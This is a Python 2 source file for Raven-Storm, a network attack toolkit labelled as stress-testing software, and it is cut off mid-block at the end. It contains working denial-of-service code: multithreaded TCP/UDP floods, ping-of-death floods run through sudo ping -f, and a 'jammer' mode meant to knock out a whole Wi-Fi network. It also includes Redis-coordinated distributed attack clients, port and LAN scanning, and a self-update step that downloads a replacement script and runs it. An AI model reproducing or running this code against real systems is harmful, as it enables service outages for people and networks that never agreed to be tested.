# MIT LICENCE Taguar258 2019
# Please read the Licence to know your permissions.

argvexit = False
try:
  import socket
  import os
  import sys
  import time
  from threading import Thread
  import urllib2
  import re
  import redis
  import pickle
  import wget
  #import netifaces
  import nmap
  try:
   import readline
  except:
   pass
  import requests
  #import platform
  #  from getpass import getpass
except Exception as e:
  print("Imports could not be done/missing imports.")
  print("All imports of file: (socket, os, sys, time, threading, urllib2, pickle, re), redis, wget, nmap.")
  print(e)
  argvexit = True
  sys.exit()
if argvexit:
  sys.exit()

#sys.argv.append("-ros")
#sys.argv.append("values")
#sys.argv.append("-c")
#sys.argv.append("new.list")
#sys.argv.append("-dv")

# run check server available for loop port ip

# Please Read  : LICENCE
# Please Read  : LICENCE
# Please Read  : LICENCE
# Please Read  : LICENCE
# Please Read  : LICENCE
# Please Read  : LICENCE
# Please Read  : LICENCE
# Please Read  : LICENCE


# maybe:
#Bluetooth(Dangerous)(Alpha): *
#        bpod interface = Set the interface.
#        bpod threads   = Set the amount of threads.
#        bpod size         = Set the package size.
#        bpod targets   = Set the target.
#        bpod sleep      = Delay between threads.
#       bpod run          = Run BLEPOD.

# lightweight message per threads just one message on same status
# ping speed check
# http speed check
# bugfix

try:
   if "--update" == sys.argv[1]:
         try:
           os.system("rm -i %s" % sys.argv[0])
           wget.download("https://github.com/Taguar258/Raven-Storm/blob/master/rs.pyo?raw=true ")
           os.system("mv rs.pyo?raw=true %s" % sys.argv[0])
         except:
           print("Error.")
           sys.exit()
except:
   pass


rsversion = "2.8" # on going, currently still -
#offline = True

ip = ""
port = 80
messages = 'hello its me, rs'
threads = 160
rtxt = 1
messagezw = messages
sleepy = 0
timeforstress = 0.5
stresserror = "false"
stressstep = 2
runactive = 'true'

outtxt = "true"
outtxtmute = False
zwouttxt = "true"
modeh = "false"
stress = "false"
stresstestvar = 1
setmb = 0
helphelp = 'true'

autostart = 0
autostop = 0
autostep = 0
autostarttime = 0

# list
listwebtext = ""
listweblist = "" # << will become array
listwebtrue = "false"

listportstext = ""
listportslist = "" # << will become array
listportstrue = "false"

# ddos | new:
hclient = False
hserver = False
hip = "127.0.0.1"
hport = "6379"
myclid = 1

#method: udp, tcp
socketmethod = "tcp"

runcomonstart = []

# pod
podtarget = ""
podsize = 65500
podmaxsize = 65500
podminsize = 5
podthreads = 30
podsleep = 0
podautodl = 0
podinterval = 0

layersevenmethod = ["REQUEST"]
layersevenpostvar = ""
layersevenposttxt = ""
layersevengetvar = ""
layersevengettxt = ""
layerseventarget = ""
layerseventhreads = 200
layerseveninterval = 0
layersevensleep = 0

nmapinstalledq = False

userissueshva = False
try:
   if sys.argv[1] == "!-sh1va73":
      userissueshva = True
      print("Thank you.")
      raw_input("[Press enter]")
except:
    pass

try:
   nm = nmap.PortScanner()
   nmapinstalledq = True
except:
   print("Please install nmap.")
   print("Some functions will not work without it.")
   try:
      raw_input("[Press enter to continue without nmap]")
   except:
      sys.exit()

# verbosed:
verbosed = False
try:
    if "-dv" in sys.argv:
        verbosed = True
except:
    verbosed = False
if verbosed:
    print("[Verbosed True]")
    import pdb
    #pdb.set_trace()

# help
if "-h" in sys.argv or "--help" in sys.argv:
    print("Please have a look at the RavenStorm documentation. [c, ros, f]")
    sys.exit()
if "-dgcn" in sys.argv:
    print("Made by Taguar258. JL")
    sys.exit()

# automated
lister = []
try:
  lister = pickle.load(open("ravenstorm-automated-list.ravenstormlist", "r"))
  if verbosed:
    print(lister)
except:
  lister = []

iplister = 0
portlister = 0
threadslister = 0
messageslister = 0
rtxtlister = 0
sleepylister = 0
outtxtlister = 0
outtxtmutelister = 0
hiplister = 0
hportlister = 0
socketmethodlister = 0
podsizelister = 0
podthreadslister = 0
podsleeplister = 0
podautodllister = 0
podintervallister = 0

iplisterstandard = ip
portlisterstandard = port
threadslisterstandard = threads
messageslisterstandard = messages
rtxtlisterstandard = rtxt
sleepylisterstandard = sleepy
outtxtlisterstandard = outtxt
outtxtmutelisterstandard = outtxtmute
hiplisterstandard = hip
hportlisterstandard = hport
socketmethodlisterstandard = socketmethod
podsizelisterstandard = podsize
podthreadslisterstandard = podthreads
podsleeplisterstandard = podsleep
podautodllisterstandard = podautodl
podintervallisterstandard = podinterval


if len(lister) != 0:
  try:
    for listinglister in lister:
      if listinglister[0] == "ip":
        if iplister == 0:
          ip = listinglister[1]
          iplisterstandard = listinglister[1]
          iplister = int(listinglister[2])
        elif int(listinglister[2]) > int(iplister):
          ip = listinglister[1]
          iplisterstandard = listinglister[1]
          iplister = int(listinglister[2])
      elif listinglister[0] == "port":
        if portlister == 0:
          port = listinglister[1]
          portlisterstandard = listinglister[1]
          portlister = int(listinglister[2])
        elif int(listinglister[2]) > int(portlister):
          port = listinglister[1]
          portlisterstandard = listinglister[1]
          portlister = int(listinglister[2])
      elif listinglister[0] == "threads":
        if threadslister == 0:
          threads = listinglister[1]
          threadslisterstandard = listinglister[1]
          threadslister = int(listinglister[2])
        elif int(listinglister[2]) > int(threadslister):
          threads = listinglister[1]
          threadslisterstandard = listinglister[1]
          threadslister = int(listinglister[2])
      elif listinglister[0] == "messages":
        if messageslister == 0:
          messages = listinglister[1]
          messageslisterstandard = listinglister[1]
          messageslister = int(listinglister[2])
        elif int(listinglister[2]) > int(messageslister):
          messages = listinglister[1]
          messageslisterstandard = listinglister[1]
          messageslister = int(listinglister[2])
      elif listinglister[0] == "rtxt":
        if rtxtlister == 0:
          rtxt = listinglister[1]
          rtxtlisterstandard = listinglister[1]
          rtxtlister = int(listinglister[2])
        elif int(listinglister[2]) > int(rtxtlister):
          rtxt = listinglister[1]
          rtxtlisterstandard = listinglister[1]
          rtxtlister = int(listinglister[2])
      elif listinglister[0] == "sleepy":
        if sleepylister == 0:
          sleepy = listinglister[1]
          sleepylisterstandard = listinglister[1]
          sleepylister = int(listinglister[2])
        elif int(listinglister[2]) > int(sleepylister):
          sleepy = listinglister[1]
          sleepylisterstandard = listinglister[1]
          sleepylister = int(listinglister[2])
      elif listinglister[0] == "outtxt":
        if outtxtlister == 0:
          outtxt = listinglister[1]
          outtxtlisterstandard = listinglister[1]
          outtxtlister = int(listinglister[2])
        elif int(listinglister[2]) > int(outtxtlister):
          outtxt = listinglister[1]
          outtxtlisterstandard = listinglister[1]
          outtxtlister = int(listinglister[2])
      elif listinglister[0] == "outtxtmute":
        if outtxtmutelister == 0:
          outtxtmute = listinglister[1]
          outtxtmutelisterstandard = listinglister[1]
          outtxtmutelister = int(listinglister[2])
        elif int(listinglister[2]) > int(outtxtmutelister):
          outtxtmute = listinglister[1]
          outtxtmutelisterstandard = listinglister[1]
          outtxtmutelister = int(listinglister[2])
      elif listinglister[0] == "hip":
        if hiplister == 0:
          hip = listinglister[1]
          hiplisterstandard = listinglister[1]
          hiplister = int(listinglister[2])
        elif int(listinglister[2]) > int(hiplister):
          hip = listinglister[1]
          hiplisterstandard = listinglister[1]
          hiplister = int(listinglister[2])
      elif listinglister[0] == "hport":
        if hportlister == 0:
          hport = listinglister[1]
          hportlisterstandard = listinglister[1]
          hportlister = int(listinglister[2])
        elif int(listinglister[2]) > int(hportlister):
          hport = listinglister[1]
          hportlisterstandard = listinglister[1]
          hportlister = int(listinglister[2])
      elif listinglister[0] == "method":
        if socketmethodlister == 0:
          socketmethod = listinglister[1]
          socketmethodlisterstandard = listinglister[1]
          socketmethodlister = int(listinglister[2])
        elif int(listinglister[2]) > int(socketmethodlister):
          socketmethod = listinglister[1]
          socketmethodlisterstandard = listinglister[1]
          socketmethodlister = int(listinglister[2])
      elif listinglister[0] == "podsize":
        if podsizelister == 0:
          podsize = listinglister[1]
          podsizelisterstandard = listinglister[1]
          podsizelister = int(listinglister[2])
        elif int(listinglister[2]) > int(podsizelister):
          podsize = listinglister[1]
          podsizelisterstandard = listinglister[1]
          podsizelister = int(listinglister[2])
      elif listinglister[0] == "podthreads":
        if podthreadslister == 0:
          podthreads = listinglister[1]
          podthreadslisterstandard = listinglister[1]
          podthreadslister = int(listinglister[2])
        elif int(listinglister[2]) > int(podthreadslister):
          podthreads = listinglister[1]
          podthreadslisterstandard = listinglister[1]
          podthreadslister = int(listinglister[2])
      elif listinglister[0] == "podsleep":
        if podsleeplister == 0:
          podsleep = listinglister[1]
          podsleeplisterstandard = listinglister[1]
          podsleeplister = int(listinglister[2])
        elif int(listinglister[2]) > int(podsleeplister):
          podsleep = listinglister[1]
          podsleeplisterstandard = listinglister[1]
          podsleeplister = int(listinglister[2])
      elif listinglister[0] == "podinterval":
        if podintervallister == 0:
          podinterval = listinglister[1]
          podintervallisterstandard = listinglister[1]
          podintervallister = int(listinglister[2])
        elif int(listinglister[2]) > int(podintervallister):
          podinterval = listinglister[1]
          podintervallisterstandard = listinglister[1]
          podintervallister = int(listinglister[2])
      elif listinglister[0] == "podautodl":
        if podautodllister == 0:
          podautodl = listinglister[1]
          podautodllisterstandard = listinglister[1]
          podautodllister = int(listinglister[2])
        elif int(listinglister[2]) > int(podautodllister):
          podautodl = listinglister[1]
          podautodllisterstandard = listinglister[1]
          podautodllister = int(listinglister[2])
  except Exception as ee:
    pass

def listeradd(where, value, lister):
  try:
    coni = False
    nnn = 0
    for zw, l in enumerate(lister):
      if l[1] == value:
        coni = True
        nnn = zw
    if coni:
      for zw, l in enumerate(lister):
        if zw == nnn:
          l[2] += l[2]
    else:
      lister.insert(0, [where, value, 1])
    return lister
  except:
    return lister

argvexit = False

try:
  if "-ros" in sys.argv:
    runcomonstart = " ".join(sys.argv).split("-ros ")[1].split(" -")[0].split(", ")
except Exception as e:
  print("Error", e)
  argvexit = True

#red
try:
   if "-dred" in sys.argv:
      os.system("for key in $(redis-cli -p 6379 keys \\*); do echo \"Key : '$key'\" ; redis-cli -p 6379 GET $key; done")
      argvexit = True
except:
   pass

# config file
try:
  if "-c" in sys.argv:
    conffile = " ".join(sys.argv).split("-c")[1][1:].split(" ")[0]
    if os.path.isfile(conffile):
      for g in open(conffile, "r").read().split("\n"):
        if "" != g:
          try:
            i = ""
            i = g.split(" = ")
            if verbosed:
               print(i[0], i[1])
            if i[0] == "ip":
              ip = str(i[1])
            elif i[0] == "port":
              port = int(i[1])
            elif i[0] == "threads":
              threads = int(i[1])
            elif i[0] == "message":
              messages = str(i[1])
            elif i[0] == "repeat":
              messages = (messages * i[1])
            elif i[0] == "sleep":
              sleepy = float(i[1])
            elif i[0] == "output":
              messages = str(i[1])
            elif i[0] == "stress":
              stress = str(i[1])
            elif i[0] == "stressstep":
              stressstep = int(i[1])
            elif i[0] == "mb":
              rtxt = int(int(setmb) / 0.000001)
            elif i[0] == "autostart":
              autostart = int(i[1])
            elif i[0] == "autostop":
              autostop = int(i[1])
            elif i[0] == "autostep":
              autostep = int(i[1])
            elif i[0] == "hip":
              hip = str(i[1])
            elif i[0] == "hport":
              hport = int(i[1])
            elif i[0] == "runonstart":
              runcomonstart = i[1].split(", ")
            elif i[0] == "method":
              socketmethod = str(i[1])
            elif i[0] == "pod target":
              podtarget = i[1]
            elif i[0] == "pod threads":
              podthreads = int(i[1])
            elif i[0] == "pod size":
              podsize = int(i[1])
            elif i[0] == "pod sleep":
              podsleep = float(i[1])
            elif i[0] == "pod interval":
              podinterval = int(i[1])
            elif i[0] == "pod auto stop":
              podautodl = int(i[1])
          except Exception as i:
            print("Error:", i)
            argvexit = True
    else:
      print("No such config file.", conffile)
      argvexit = True
except:
  pass
if argvexit:
  sys.exit()
if verbosed:
  raw_input("")

# Test if I blocked application ( check if github repository is active. ). + Check if offline
os.system("clear")
checkstatusofrepository = ""
checkstatustrue = "false"
print("Starting...")
try:
   if verbosed:
      print("[Check: Taguar258/Raven-Storm]")
   checkstatusofrepository = urllib2.urlopen("https://github.com/Taguar258/Raven-Storm")
   checkstatusofrepository = checkstatusofrepository.read()
   #print(checkstatusofrepository)
   time.sleep(0.2)
   if "not found" in checkstatusofrepository:
      print("Execution blocked, because github page doesnt exist anymore.")
      sys.exit()
      quit()
   elif "" != checkstatusofrepository:
    checkstatustrue = "true"
   else:
    print("Execution blocked, because github page doesnt exist anymore.")
    sys.exit()
    quit()
except:
  print("Check internet connection...")
  try:
    if verbosed:
        print("[Check: Github")
    checkstatusofrepository = ""
    checkstatusofrepository = urllib2.urlopen("https://github.com").read()
    time.sleep(0.2)
    if "404" in checkstatusofrepository:
      print("You are offline, you need to be online to use this tool.")
      sys.exit()
      quit()
  except:
    print("You are offline, you need to be online to use this tool.")
    sys.exit()
    quit()

checkstatusofrepository = ""

if checkstatustrue == "false":
  print("Execution blocked, because github page doesnt exist anymore.")
  sys.exit()
  quit()


# Update
print("Checking for updates...")
print("Current version: %s" % rsversion)
checkstatusofrepository = "" #change back to normal
if verbosed:
     print("[Check: Version]")
checkstatusofrepository = urllib2.urlopen("https://github.com/Taguar258/Raven-Storm/wiki/Version").read()
time.sleep(0.2)
if not ("Version:%s" % rsversion) in checkstatusofrepository:
  print("")
  print("There is a new version, feel free to update it:")
  print("")
  
  updateresult = re.search('Info:(.*):Info', checkstatusofrepository)
  print(updateresult.group(1).replace("\\n", "\n"))
  
  print("")
  if "forceupdate" in checkstatusofrepository or ("forceupdate%s" % rsversion) in checkstatusofrepository:
    print("You need to update the program, to run it...")
    print("You can update using RS itself, in the Raven-Storm folder.")
    print("Just run: 'python2 %s --update'." % sys.argv[0])
    sys.exit()
    quit()
  try:
     raw_input("[Press enter]")
  except:
     sys.exit()
     quit()

#os.system("clear")
#SCREEN_WIDTH = 80
#centered = operator.methodcaller('center', SCREEN_WIDTH)
#print(centered("Raven-Storm."))
#time.sleep(0.5)
#os.system("clear")
#print(centered("Raven-Storm.."))
#time.sleep(0.5)
#os.system("clear")
#print(centered("Raven-Storm..."))
#time.sleep(0.5)

#print(checkstatusofrepository)
#raw_input()

def inporarg(label, comname, com):
    #print(com.split("%s " % comname))
    if verbosed: print("[INPUT or ARGUMENT]")
    if verbosed: print("[Lable: %s]" % label)
    if verbosed: print("[ComName: %s]" % comname)
    if verbosed: print("[Com: %s]" % com)
    if verbosed: print("[%s]" % com.split("%s " % comname))
    if len(com.split("%s " % comname)) == 2:
       if verbosed: print("[ONLY 2 LEN]")
       if com.split("%s " % comname)[1] == "":
           if verbosed: print("[2 LEN BLANC]")
           zw = raw_input("\033[1;32;40m   %s: " % label)
       else:
           if verbosed: print("[2 LEN not Blanc]")
           zw = com.split("%s " % comname)[1]
           print("\033[1;32;40m   %s: %s" % (label, zw))
    else:
       if verbosed: print("[ONLY 1 or more LEN: %s]" % len(com.split("%s " % comname)))
       zw = raw_input("\033[1;32;40m   %s: " % label)
    if verbosed: print("[Return: %s]" % zw)
    return zw


def checkipexists(ip, port):
  try:
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     result = sock.connect_ex((str(ip), int(port)))
     if result == 0:
       return True
     else:
       return False
  except:
     return False

def redisinbackground():
    os.system("redis-server  > /dev/null")

def hbi(ip):
   return("   %s" % socket.gethostbyname(ip))

def speedtest(url):
   try:
      if not "http" in url or not "://" in url:
         url = ("https://%s" % url)
      print("   Test starting...")
      start = time.time()
      response = urllib2.urlopen(url)
      webcontent = response.read()
      end = time.time()
      result = (end - start)
      return result
   except Exception as e:
      return ("Error: %s" % e)
      #return "Error"

def speedping(ip):
   try:
      print("   Test starting...")
      start = time.time()
      os.system("ping -c 1 %s > /dev/null" % ip)
      end = time.time()
      result = (end - start)
      return result
   except Exception as e:
      return ("Error: %s" % e)
      #return "Error"

def podtesting(size, target, threads, threadssleep, podinterval, podautodl):
   targets = []
   feat = ""
   if podinterval != 0:
      feat += ("-i %s " % podinterval)
   if podautodl != 0:
      feat += ("-w %s " % podautodl)
   if type(target) is list:
      targets = target
   else:
      targets = [target]
   target = targets
   killcom = ('sudo ping -f -q -s %s %s %s  > /dev/null' % (size, feat, target)).replace("  ", " ")
   print(killcom)


def pod(size, target, threads, threadssleep, podinterval, podautodl):
   print("Running...\n[Enter ctrl + z to stop the attack]")
   targets = []
   feat = ""
   if podinterval != 0:
      feat += ("-i %s " % podinterval)
   if podautodl != 0:
      feat += ("-w %s " % podautodl)
   if type(target) is list:
      targets = target
   else:
      targets = [target]
   target = ""
   for target in targets:
      if os.geteuid()==0:
         print("Sudo mode.")
         killcom = ('sudo ping -f -q -s %s %s %s  > /dev/null' % (size, feat, target)).replace("  ", " ")
         if userissueshva:
            print("sh1va73 mode.")
            killcom = ('sudo ping -f -q -s %s %s' % (size, target))
         #print(killcom)
      else:
         print("Normal mode.")
         killcom = ("ping -q -s %s %s %s > /dev/null" % (size, feat, target)).replace("  ", " ")
         if userissueshva:
            print("sh1va73 mode.")
            killcom = ("ping -q -s %s %s" % (size, target))
      if verbosed:
        print(killcom)
      try:
         for i in range(int(threads)):
            os.system(killcom)
            time.sleep(float(threadssleep))
      except KeyboardInterrupt:
         os.system("killall ping")
         print("\033[1;32;0mStopped.")
         sys.exit()
      except Exception as pingerror:
         print("Error.", pingerror)
         os.system("killall ping")
         print("\033[1;32;0mStopped.")
         sys.exit()
      try:
         raw_input("")
         os.system("killall ping")
         print("\033[1;32;0mStopped.")
         sys.exit()
      except:
         #os.system("killall ping")
         print("\033[1;32;0mStopped.")
         sys.exit()
      print("Killed.")

def lanscan():
   try:
      gateways = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      gateways.connect(("8.8.8.8", 80))
      gateway = ".".join((gateways.getsockname()[0].split("."))[:len(gateways.getsockname()[0].split(".")) - 1])
      gateways.close()
      nm.scan(hosts=("%s.0/24" % gateway), arguments="-sP")
      lanscandev = [(x, nm[x]['status']['state'], nm[x]["hostnames"][0]["name"], nm[x]["hostnames"][0]["type"]) for x in nm.all_hosts()]
      print("Gate way: %s.0" % gateway)
      for lanscandevice in lanscandev:
         print("%s  %s  %s  %s" % (lanscandevice[0], lanscandevice[1], lanscandevice[2], lanscandevice[3]))
   except Exception as e:
      print("Error.", e)


def stresstest():
    import threading
    global threads
    global stresstestvar
    global stresserror
    global runactive
    print(" ")
    #print("\033[1;32;40mStarting with " + str(threads) + "\033[1;32;40m threads...")
    print("\033[1;32;40mTime between: %s" % str(timeforstress))
    print("\033[1;32;40mUsing %s threads per round" % str(threads))
    #print("\033[1;32;40mStep: " + str(stressstep))
    print(" ")
    #threads = 1
    time.sleep(2)
    while True:
      if hclient:
        try:
          if hr.get("running") != "true":
            print("Killed by server.")
            sys.exit()
        except:
          print("Killed by server.")
          sys.exit()
      for w in range(1):
          t = threading.Thread(target=ddos)
          t.start()
      time.sleep(timeforstress)
      if stresserror == 'true':
          print(" ")
          print("\033[1;32;40mStopped at %s threads!" % (str(stresstestvar * threads))) #str(stresstestvar * threads)
          print(" ")
          runactive = 'false'
          sys.exit()
      else:
          stresstestvar += 1


def scann(targetIP):
   print(" ")
   try:
      for p in range(1, 1500):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         res = sock.connect_ex((targetIP, p))
         if res == 0:
            print("\033[1;32;40mPort: %s" % str(p))
            sock.close()
   except Exception:
      print("\033[1;32;40mThere was an error.")
      sys.exit()
      print(" ")
   print(" ")
   
def ddos():
   global stresserror
   global runactive
   #message = (str(messages) * int(rtxt))
   autotimer = ""
   mesalready = False
   message = str("%s rs" % messages)
   if not outtxtmute:
     print("\033[1;32;40m\nOk!")
   #if socketmethod != "udp":
   #   mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   #else:
   #   mysocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   while runactive == 'true':
    if hclient:
      try:
        if hr.get("running") != "true":
          print("Killed by server.")
          sys.exit()
      except:
        print("Killed by server.")
        sys.exit()
    if listwebtrue == "true":
      if listportslist == "true":
        for listwebnum, listwebvalue in enumerate(listweblist):
          for listportsnum, listportsvalue in enumerate(listportslist):
            try:
              listwebtext = ("for %s " % listwebvalue)
              if socketmethod != "udp":
                 mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
              else:
                 mysocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
              if socketmethod != "udp":
                 mysocket.connect((listwebvalue, listportsvalue))
              #else:
              #mysocket.bind((listwebvalue, listportsvalue))
              if socketmethod != "udp":
                 mysocket.send(str.encode("GET %sHTTP/1.1 \r\n" % message))
              mysocket.sendto(str.encode("GET %sHTTP/1.1 \r\n" % message), (listwebvalue, listportsvalue))
              if outtxt == 'true':
                if not mesalready:
                   mesalready = True
                   print("\033[1;32;40m\nSuccess for %s with port %s!" % (listwebvalue, listportsvalue))
              time.sleep(sleepy)
            except socket.error:
              if not outtxtmute:
                mesalready = False
                print("\033[1;31;40m\nTarget %s with port %s down!, continuing..." % (listwebvalue, listportsvalue))
              if stress == 'true':
                stresserror = 'true'
              if socketmethod != "udp":
                mysocket.close()
      else:
        for listwebnum, listwebvalue in enumerate(listweblist):
          try:
            listwebtext = ("for %s " % listwebvalue)
            if socketmethod != "udp":
               mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            else:
               mysocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            if socketmethod != "udp":
               mysocket.connect((listwebvalue, port))
            else:
               mysocket.bind((listwebvalue, port))
            if socketmethod != "udp":
               mysocket.send(str.encode("GET %sHTTP/1.1 \r\n" % message))
            mysocket.sendto(str.encode("GET %sHTTP/1.1 \r\n" % message), (listwebvalue, port))
            if outtxt == 'true':
              if not mesalready:
                 mesalready = True
                 print("\033[1;32;40m\nSuccess for %s!" % listwebvalue)
            time.sleep(sleepy)
          except socket.error:
            if not outtxtmute:
              mesalready = False
              print("\033[1;31;40m\nTarget %s down!, continuing..." % listwebvalue)
            if stress == 'true':
              stresserror = 'true'
            if socketmethod != "udp":
              mysocket.close()
    else:
      if listportstrue == "true":
        for listportsnum, listportsvalue in enumerate(listportslist):
          try:
            if socketmethod != "udp":
               mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            else:
               mysocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            if socketmethod != "udp":
               mysocket.connect((ip, listportsvalue))
            else:
               mysocket.bind((ip, listportsvalue))
            if socketmethod != "udp":
               mysocket.send(str.encode("GET %sHTTP/1.1 \r\n" % message))
            mysocket.sendto(str.encode("GET %sHTTP/1.1 \r\n" % message), (ip, listportsvalue))
            if outtxt == 'true':
              if not mesalready:
                mesalready = True
                print("\033[1;32;40m\nSuccess with port %s!" % listportsvalue)
            time.sleep(sleepy)
          except socket.error:
            if not outtxtmute:
              mesalready = False
              print("\033[1;31;40m\nTarget with port %s down!, continuing..." % listportsvalue)
            if stress == 'true':
              stresserror = 'true'
            if socketmethod != "udp":
              mysocket.close()
      else:
        try:
          if socketmethod != "udp":
             mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          else:
             mysocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
          if socketmethod != "udp":
             mysocket.connect((ip, port))
          else:
             mysocket.bind((ip, port))
          if socketmethod != "udp":
             mysocket.send(str.encode("GET %sHTTP/1.1 \r\n" % message))
          mysocket.sendto(str.encode("GET %sHTTP/1.1 \r\n" % message), (ip, port))
          if outtxt == 'true':
            if not mesalready:
               mesalready = True
               print("\033[1;32;40m\nSuccess!")
          time.sleep(sleepy)
        except socket.error as eee:
          if verbosed:
             print("\033[1;31;40m\nTarget down!, continuing...", eee)
          else:
             if not outtxtmute:
               mesalready = False
               print("\033[1;31;40m\nTarget down!, continuing...")
          if stress == 'true':
            stresserror = 'true'
          if socketmethod != "udp":
            mysocket.close()
    
    if int(autostop) != 0:
      autoendtime = time.time()
      autotimer = (int(autoendtime) - int(autostarttime))
      #print(autoendtime)
      #print(autostarttime)
      #print(autotimer)
      if autostop <= autotimer:
        print("\033[1;32;0mAuto Stop")
        sys.exit()

   for i in range(threads):
      try:
         t = threading.Thread(target=ddos)
         t.start()
      except:
         pass


clear = "clear"
print("\033[1;32;40m ")
os.system(clear)
print ("""\033[1;32;40m
  -----------------------------------------------------------
   (                                                        
   )\ )                                 )            v. """ + rsversion + """
  (()/(    )   )      (              ( /(      (       )    
   /(_))( /(  /((    ))\  (      (   )\()) (   )(     (     
  (_))  )(_))(_))\  /((_) )\ )   )\ (_))/  )\ (()\    )\  ' 
  | _ \((_)_ _)((_)(_))  _(_/(  ((_)| |_  ((_) ((_) _((_))  
  |   // _` |\ V / / -_)| ' \)) (_-<|  _|/ _ \| '_|| '  \() 
  |_|_\\__,_| \_/  \___||_||_|  /__/ \__|\___/|_|  |_|_|_|  
                                                            
  Stress-Testing-Toolkit
  Made by Taguar258! MIT 2019
  
  I am not responsible, for your activitys!\n  Or errors in the programm!
  It is illegal, to use on not owned servers.
  ----------------------------------------------------------""")

def agreed():
   global verbosed
   if verbosed:
      print("[Check: Agreement]")
   print("")
   agreement = raw_input("\033[1;32;40mDo you agree to use this tool for legal purposes only? (y/N) ")
   if agreement == 'y':
    if hserver:
      try:
        hr.set("agree", "true")
      except:
        sys.exit()
   else:
      sys.exit()
   print(" ")

def helptext():
   print("""\033[1;32;40m
   
  Main:
  |-- help        = This help message.
  |-- update      = Update script.
  |-- quit/exit   = Quit ; Exit.
  |-- values      = Output all set variables.
  |-- >>          = Run shell command.

  Layer-4:
  |
  |-- Main commands:
  |   |-- set port    = Set the port.
  |   |-- set threads = Set the number of threads.
  |   |-- set ip      = Set the IP.
  |   |-- set web     = Set IP of website.
  |   |-- method      = Set attack method: UPD, TCP.
  |   |-- set sleep   = Set waiting time between sends.
  |   |-- outtxt      = Output text enable/disable.
  |   |-- mute        = Do not output connection reply.
  |   |-- run         = To run.
  |    
  |-- Set Send-text:
  |   |-- set message = Set message.
  |   |-- set r       = Repeat text.
  |   |-- set mb      = Send choosen amount of mb to server.
  |
  |-- Stress Testing:
  |   |-- stress      = Stress-testing mode.
  |   |-- st wait     = Time between stress tests.
  |
  |-- Multiple:
  |   |-- set listip   = Use IP list to attack.
  |   |-- set listweb  = Use website list to attack.
  |   |-- set listport = Attack multiple ports.
  |
  |-- Automation:
  |   |-- auto start = Time after Attack should start.
  |   |-- auto step  = Time between next thread to activate.
  |   |-- auto stop  = Time after attack should stop.

  Layer-3:
  |
  |-- Main commands:
  |   |-- pod target      = Set the target.
  |   |-- pod target list = Set multiple targets.
  |   |-- pod size        = Set packet size.
  |   |-- pod threads     = Threads to use.
  |   |-- pod sleep       = Delay between threads.
  |   |-- pod interval    = Delay between each packet send.
  |   |-- pod auto stop   = Automatically stop attack after x seconds.
  |   |-- pod run         = Run the Ping of Death.
  |   |-- pod jammer      = Kill a whole wifi network, by targeting all.

  Scaning:
  |
  |-- Port scanning:
  |   |-- get port i   = Get port of IP (get port i).
  |   |-- get port w   = Get port of web (get port w).
  |
  |-- Network scanning:
  |   |-- lan scan     = Get all Ips of Wifi.
  |
  |-- Domain scanning:
  |   |-- hbi         = Get the IP by host.
  |   |-- post scan   = Get all post variables of a Website.
  |
  |-- Speed testing:
  |   |-- speed down  = Return the time it needs to open a website.
  |   |-- speed ping  = Return the time it needs to ping an IP.

  DDOS:
  |
  |-- Main commands:
  |   |-- redis run      = Enable the redis server.
  |   |-- redis run hide = Enable the redis server in background.
  |   |-- server start   = Start a server for clients, to make your attack stronger.
  |   |-- client connect = Connect your client, to the host server.
  |   |-- server ip      = Set IP of the device hosting Redis.
  |   |-- server port    = Set the port of device hosting Redis. (Should be already set.)
  |
  |-- First start redis-server by entering redis-server in a new terminal.
  |-- First start a server, then connect clients.

  Use Fast-Usage and plenty more: 
  |- Have a look at the official documentation on GitHub. 
   
  
  To stop running attack >>> [Crtl + z]
   
    """)

i = 1
#helptext()

if verbosed:
    print("[Set-Check: In case ip,port,threads; argv set - set]")
try:
   if "-fd" == sys.argv[1]:
      try:
        ip = sys.argv[2]
        port = int(sys.argv[3])
        threads = int(sys.argv[4])
        i = 7
        agreed()
        print("\033[1;32;40mTo stop press: CRTL + z")
        time.sleep(3)
        for maxthreads, i in enumerate(range(threads)):
           try:
              t = Thread(target=ddos)
              time.sleep(autostep)
              t.start()
           except:
              print("\033[1;32;0mCould not start thread %s." % maxthreads)
      except:
        print("Could not start dos by given inputs.")
        sys.exit()
except:
    pass

try:
   if "-fp" == sys.argv[1]:
      try:
        podtarget = sys.argv[2]
        podthreads = sys.argv[3]
        try:
           podsize = int(sys.argv[4])
           if podsizezw < podminsize:
              print("Size needs to be more than 4kb.")
              podsize = 65500
              print("Size updated by default to 65500kb.")
           elif podsizezw > podmaxsize:
              print("Size needs to be less than 65500kb.")
              podsize = 65500
              print("Size updated by default to 65500kb.")
        except:
           podsize = 65500
        try:
           podsleep = float(sys.argv[5])
        except:
           podsleep = 0
           print("Sleep updated by default to 0.")
        try:
           podinterval = int(sys.argv[6])
        except:
           podinterval = 0
           print("interval updated by default to 0.")
        try:
           podautodl = int(sys.argv[7])
        except:
           podautodl = 0
           print("Auto stop updated by default to 0.")
        agreed()
        pod(podsize, podtarget, podthreads, podsleep, podinterval, podautodl)
      except:
        print("Could not start pod by given inputs.")
        sys.exit()
except:
    pass

print("""\033[1;32;40m
   Main Commands:
   |-- help        = This help message.
   |-- set port    = Set the port.
   |-- set threads = Set the number of threads.
   |-- set ip      = Set the IP.
   |-- set web     = Set IP of website.
   |-- method     = Set attack method: UPD, TCP.
   |-- set sleep   = Set waiting time between sends in Seconds.
   |-- outtxt      = Output text enable/disable.
   |-- values      = Output all set variables.
   |-- run         = To run.
   |-- update      = Update script.
   |-- quit/exit   = Quit ; Exit 
    
   Enter "help" to see >much< more...!

""")


# fast redis
if verbosed:
    print("[Set-Check: Redis start using argv]")
    print(" ".join(sys.argv))
    if 'server start' in " ".join(sys.argv):
       print(" ".join(sys.argv).split("server start")[1][1:].split(" ")[:2])
    elif 'client connect' in " ".join(sys.argv):
       print(" ".join(sys.argv).split("client connect")[1][1:].split(" ")[:2])
    else:
